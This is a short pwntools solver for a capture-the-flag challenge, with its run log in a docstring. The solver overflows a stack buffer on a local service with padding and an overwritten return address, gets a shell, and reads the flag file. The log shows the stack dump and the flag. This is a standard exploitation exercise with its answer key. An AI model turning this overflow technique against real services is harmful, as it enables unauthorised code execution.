from pwn import *

io = remote("127.0.0.1", 30006)

print(io.readuntil("?"))

s = b"taskctf{" + b"A" * 48
s += p64(0x4013f7)

io.sendline(s)
io.interactive()

"""
$ python3 solver/solve2.py 
[+] Opening connection to 127.0.0.1 on port 30006: Done
/home/user/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:1433: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return func(self, *a, **kw)
b'What is the flag?'
[*] Switching to interactive mode

***start stack dump***
0x7fffffffebd0: 0x7b6674636b736174 <- rsp
0x7fffffffebd8: 0x4141414141414141
0x7fffffffebe0: 0x4141414141414141
0x7fffffffebe8: 0x4141414141414141
0x7fffffffebf0: 0x4141414141414141
0x7fffffffebf8: 0x4141414141414141
0x7fffffffec00: 0x4141414141414141 <- rbp
0x7fffffffec08: 0x00000000004013f7 <- return address
0x7fffffffec10: 0x0000000000000000
0x7fffffffec18: 0x00007ffff7df50b3
0x7fffffffec20: 0x00007ffff7fba6a0
***end stack dump***

$ ls
flag
prediction
start.sh
$ cat flag
taskctf{r0p_1s_f4mous_way}$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30006
"""
